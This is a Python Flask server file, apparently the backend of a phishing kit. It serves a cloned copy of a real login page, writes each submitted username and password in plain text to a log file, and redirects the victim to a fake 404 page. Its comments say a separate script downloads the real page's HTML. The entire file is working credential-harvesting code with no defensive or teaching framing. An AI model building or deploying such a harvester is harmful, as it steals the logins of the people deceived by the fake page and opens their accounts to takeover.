#This is backend program to capture the users info
#The bash script downloads the html of a real login page and this program acts as a backend to this
# Real creds.log and index.html are excluded from version control for privacy and security.


from flask import Flask, request, redirect, render_template_string
import logging

app = Flask(__name__)

# Setup logging to a file
logging.basicConfig(filename='creds.log', level=logging.INFO, format='%(asctime)s - %(message)s')

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        logging.info(f"Captured creds -> Username: {username}, Password: {password}")#Printing the captured credential in the creds.log
        return redirect('/404')#redirecting the user to a 404 page
    with open('index.html', 'r') as file:
        html = file.read()
    return render_template_string(html)

@app.route('/404')
def not_found():
    #The page that the user is going to be redirected to
    return "<h1>404 Not Found</h1><p>The page you are looking for does not exist.</p>", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
